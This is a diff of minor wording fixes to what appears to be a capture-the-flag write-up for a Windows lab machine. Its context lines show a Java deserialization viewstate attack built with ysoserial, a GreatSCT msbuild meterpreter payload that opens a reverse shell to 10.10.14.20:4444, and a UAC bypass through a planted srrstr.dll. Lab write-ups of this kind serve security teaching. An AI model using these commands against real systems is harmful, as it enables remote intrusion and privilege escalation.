@@ -141,7 +141,7 @@ Nothing very interesting except in web.xml.bak we see its using encrypted viewst
 <context-param>
 <description>
 ```
-After reading some more about java derialization we go back to the Mask blog here. We can use the ysoserial tool to create a valid viewstate to replace in the request, then encrypt it with DES and sign it with our Hmac-SHA1 secret. We can see both secret values are the same in the web.xml.bak file. Checking the MyFaces documentation, http://myfaces.apache.org/shared12/myfaces-shared-core/apidocs/org/apache/myfaces/shared/util/StateUtils.html, the DES mode by default is ECB and PKCS5 is the default padding which we will need. Using the ysoserial tool, https://github.com/frohoff/ysoserial, we can create simple serialized objects to test with.
+After reading some more about java deserialization issues we go back to the Mask blog here. We can use the ysoserial tool to create a valid viewstate to replace in the request, then encrypt it with DES and sign it with our Hmac-SHA1 secret. We can see both secret values are the same in the web.xml.bak file. Checking the MyFaces documentation, http://myfaces.apache.org/shared12/myfaces-shared-core/apidocs/org/apache/myfaces/shared/util/StateUtils.html, the DES mode by default is ECB and PKCS5 is the default padding which we will need. Using the ysoserial tool, https://github.com/frohoff/ysoserial, we can create simple serialized objects to test with.
 ```bash 
 $ java -jar /opt/ysoserial/ysoserial-master-55f1e7c35c-1.jar CommonsCollections5 'cmd /c ping 10.10.14.20' > ping.bin
 $ file ping.bin
@@ -328,7 +328,7 @@ $ ./GreatSCT.py --ip 10.10.14.20 --port 4444 -o 740i -t Bypass -p msbuild/meterp
  [*] Source code written to: /usr/share/greatsct-output/source/740i.xml
  [*] Metasploit RC file written to: /usr/share/greatsct-output/handlers/740i.rc
 ```
-This gives us an .rc script to run for the handler and a .xml file we copy to the Batman desktop and execute with msbuild.exe. It hangs and sends a shell.
+This gives us an .rc script for the handler and a .xml file we copy to the Batman desktop and execute with msbuild.exe. It hangs and sends a shell.
 ```cmd
 C:\Users\Batman\Desktop>C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe 740i.xml
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe 740i.xml
@@ -393,7 +393,7 @@ C:\Users>echo %PATH%
 echo %PATH%
 C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Batman\AppData\Local\Microsoft\WindowsApps
 ```
-Copy the srrstr.dll in there and just run the C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe or any other SysWOW64 SystemProperties binary, make sure the msf handler is still running and our shell back this time has much better privileges.
+Copy the srrstr.dll in there and just run the C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe or any other SysWOW64 SystemProperties binary, make sure the msf handler is still running and our shell back this time has much better privileges with no UAC.
 ```cmd
 msf5 exploit(multi/handler) > sessions -i 2
 [*] Starting interaction with 2...
